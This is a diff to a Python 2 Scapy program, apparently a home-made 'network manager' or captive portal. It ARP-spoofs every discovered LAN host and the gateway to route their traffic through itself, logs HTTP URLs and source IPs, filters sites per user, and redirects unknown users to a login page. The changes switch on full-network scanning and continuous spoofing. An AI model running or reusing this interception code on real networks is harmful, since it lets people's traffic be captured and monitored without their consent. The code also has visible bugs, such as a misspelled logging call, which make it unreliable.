@@ -16,9 +16,9 @@ from user import *
 #     #TODO: handle all cases of missing modules and try to solve
 #     print 'a module is missing please check you have all required modules'
 
+
 # global variables:
-hosts=['10.30.57.151']
-localAddresses=['10.30.57.151']
+localAddresses=[]
 addressesLock=Lock()
 gatewayMAC=''
 bad_packet=[]
@@ -53,14 +53,9 @@ def handle_Packet(pkt):
     """
 
     if ARP not in pkt:
-        #print pkt.show()
-        #TODO: implement computer block list
-
-
         if TCP in pkt:
             if 80 == pkt[TCP].dport: #check if packet is http packet
-                #pkt.show()
-                logging.info("HTTP:"+ pkt.summary())
+                logging.debug("HTTP:"+ pkt.summary())
 
                 try:
                     fields=str(pkt[Raw]).split('\r\n') #split into packet fields
@@ -72,26 +67,29 @@ def handle_Packet(pkt):
 
                     if (url != None):
                         logging.info("URL:"+url)
-                        ip=pkt[IP]
+                        ip=pkt[IP].src
+                        logging.info('IP:'+ip)
+                        new_user=True
+                        for user in user_list:
+                            if ip == user.get_ip():
+                                new_user=False
 
-                        if url == "networkmanager.com" or url == "www.networkmanager.com":
-                            functions.redirect_to_login(ip)
+                            if "networkmanager" in url or localHost in url: #check if requesting for network manager
+                                    functions.sendPacket(pkt,'00:00:00:00:00:00')
 
-                        else:
-                            new_user=True
-                            for user in user_list:
-                                if ip == user.get_ip():
-                                    new_user=False
-                                    if not blocked(user,url):
-                                        functions.sendPacket(pkt,gatewayMAC)
-                                    else:
-                                        pass
-                                        #TODO: return page is blocked
-                            if new_user:
-                                functions.redirect_to_login(ip)
+                            else:
+                                if not blocked(user,url):
+                                    functions.sendPacket(pkt,gatewayMAC)
+
+                                else:
+                                    loggin.info('%s blocked for %s' %(url,ip))
+                                    #TODO: return page is blocked
 
 
-
+                        if new_user:
+                            logging.info('redirecting %s to login (new user)' % (ip))
+                            functions.redirect_to_login(pkt)
+                            pkt.show()
 
 
                     else:
@@ -100,19 +98,20 @@ def handle_Packet(pkt):
                 except Exception as exc:
                     print exc
                     #logging.warning('failed to extract url, '+str(exc),'in:',pkt.summary())
+
     else:
         if pkt[ARP].op == 2: #check if ARP operation is: is-at
             address=pkt[ARP].psrc #extract IP address
             addressesLock.acquire()
             global localAddresses
-            if address not in localAddresses and address != defaultGateway and address!=localHost: #check for duplicates
+            if address not in localAddresses and address != defaultGateway and address!=localHost: #check for duplicates and not default gateway or local host
                 localAddresses.append(address) #add IP address to list of all hosts
                 print 'added',address
             addressesLock.release()
 
 
 
-def arpSpoof(router,localHost):
+def arpSpoof(router):
     """
     every 30 seconds send ARP broadcast to spoof all machines on LAN
     """
@@ -120,19 +119,17 @@ def arpSpoof(router,localHost):
         if len(localAddresses)>0:
             addressesLock.acquire()
             print 'spoofing',str(len(localAddresses)), localAddresses
-            for host in localAddresses:
-                if host != localHost: #check that ip does not match default gateway or local host to not send packets to them
-
+            for host in localAddresses :
+                if host != '192.168.1.11':
                     victimPacket = Ether()/ARP(op=2,psrc = router, pdst=host)#create arp packets
                     gatewayPacket=Ether()/ARP(op=2,psrc=host,pdst=router)
                     logging.debug('spoofing: '+victimPacket[ARP].pdst)
                     sendp(victimPacket,verbose=0)#send packets
                     sendp(gatewayPacket,verbose=0)
-                    victimPacket.show()
 
             addressesLock.release()
             print 'done spoofing'
-            sleep(10)
+            sleep(30)
 
 
 
@@ -152,11 +149,11 @@ def setup():
     logging.debug('got default gateway and local IP and MAC')
 
     global localAddresses
-    #localAddresses=functions.get_Local_Addresses(defaultGateway,localHost) #get addresses of all hosts on network
+    localAddresses=functions.get_Local_Addresses(defaultGateway,localHost) #get addresses of all hosts on network
     logging.debug('scanned network for all active hosts')
     print localAddresses
 
-    arpThread=Thread(target=arpSpoof,args=(defaultGateway,localHost,))
+    arpThread=Thread(target=arpSpoof,args=(defaultGateway,))
     logging.debug('created thread for ARP spoofing')
     arpThread.start()
     logging.debug('spoofing all hosts on network')
